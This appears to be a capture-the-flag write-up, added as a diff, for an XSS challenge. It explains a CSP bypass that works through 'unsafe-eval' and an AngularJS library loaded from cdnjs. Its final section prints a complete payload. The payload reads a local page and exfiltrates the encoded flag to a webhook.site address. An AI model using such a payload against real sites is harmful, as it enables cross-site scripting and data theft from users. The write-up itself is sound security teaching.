@@ -1,0 +1,22 @@
+Challenge Writeup The Galactic Times
+
+This challenge is an XSS based challenge, very similar to Alien Complain Form and Bug Report
+When you send "feedback" to /feedback, it is shown on /list which is only accessible via 127.0.0.1, aka the bot that will automatically navigate to that page once the feedback is sent. The catch however is this CSP policy
+default-src 'self';
+script-src 'self' 'unsafe-eval' https://cdnjs.cloudflare.com/;
+style-src 'self' 'unsafe-inline' https://unpkg.com/nes.css/ https://fonts.googleapis.com/;
+font-src 'self' https://fonts.gstatic.com/;
+img-src 'self' data:;
+child-src 'none';object-src 'none'
+
+The second line here is our vulnerability - we are able to run the eval command as long as our script comes from https://cdnjs.cloudflare.com/
+This leads us to using an adapted version of this payload: https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#unsafe-eval-js-cdn
+The adaptation that needs to be made is as follows...
+The first url must be changed to an appropriate endpoint which we are listening on to capture the "stolen data" (aka get output from our XSS attack), and the second url must be changed to http://127.0.0.1:1337/alien because our flag is located at /alien meaning we want to grab the contents of the page. This is because the CSP states default-src 'self' meaning requests can only be made to the same domain that the document was loaded with, which the bot accesses http://127.0.0.1:1337/list.
+
+From here we simply do some more work with js string manipulation to further shorten the base64 output sent to the server, this is done to avoid invalid requests being made when a url is too long etc. So I ended up with the following payload... Enjoy!
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
+<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };var z = new XMLHttpRequest();z.onreadystatechange = function() {if (z.responseText) location = "https://webhook.site/42bfc7b1-e0cf-4e32-b83c-46e83022e703/?data=" + btoa(unescape(encodeURIComponent(z.responseText.substring(z.responseText.search("CHTB{"), z.responseText.search("CHTB{")+50))))};z.open("GET", "http://127.0.0.1:1337/alien", false);z.send();//');}} </div>
+
+
+Base64 decoding the given output gives us the flag! CHTB{REDACTED}
